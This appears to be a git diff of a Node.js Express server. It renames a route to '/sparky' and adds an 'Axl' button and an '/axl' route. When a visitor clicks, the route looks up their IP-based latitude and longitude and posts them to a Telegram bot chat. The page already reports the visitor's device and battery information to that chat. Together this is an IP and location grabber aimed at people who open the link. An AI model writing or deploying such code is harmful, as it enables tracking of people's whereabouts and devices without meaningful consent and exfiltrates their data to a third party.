@@ -51,8 +51,8 @@ async function fetchUserData(ip) {
   }
 }
 
-// Combined Route `/ajsal`
-app.get('/ajsal', async (req, res) => {
+// Combined Route `/sparky`
+app.get('/sparky', async (req, res) => {
   const userAgent = req.headers['user-agent'];
   const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
 
@@ -96,6 +96,7 @@ app.get('/ajsal', async (req, res) => {
     <body>
       <h1>Device & Location Info Sent!</h1>
       <p>Your device and location information have been sent to Telegram.</p>
+      <button id="axlButton">Axl</button>
       <script>
         async function sendBatteryInfo() {
           try {
@@ -117,6 +118,18 @@ app.get('/ajsal', async (req, res) => {
         }
 
         sendBatteryInfo();
+
+        // Event listener for the Axl button
+        document.getElementById('axlButton').addEventListener('click', async () => {
+          try {
+            const response = await fetch('/axl');
+            const result = await response.text();
+            alert(result); // Display a simple alert to confirm action
+          } catch (error) {
+            console.error('Error fetching Axl route:', error);
+            alert('Failed to send location info.');
+          }
+        });
       </script>
     </body>
     </html>
@@ -138,6 +151,28 @@ app.post('/battery', express.json(), (req, res) => {
   bot.sendMessage(ajsal, nmessage, { parse_mode: 'Markdown' });
   
   res.status(200).send('Battery info sent to Telegram.');
+});
+
+// New route to handle button click
+app.get('/axl', async (req, res) => {
+  const userAgent = req.headers['user-agent'];
+  const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+
+  // Fetch user location data
+  const userData = await fetchUserData(userIp);
+
+  // Combine all information into one message
+  const message = `
+    🌐 *Location Info*:
+    - **Latitude**: ${userData?.latitude || "Unknown"}
+    - **Longitude**: ${userData?.longitude || "Unknown"}
+  `;
+
+  // Send the information to Telegram
+  bot.sendMessage(ajsal, message, { parse_mode: 'Markdown' });
+
+  // Respond with a simple message
+  res.send('Location info has been sent to Telegram.');
 });
 
 // Start the server
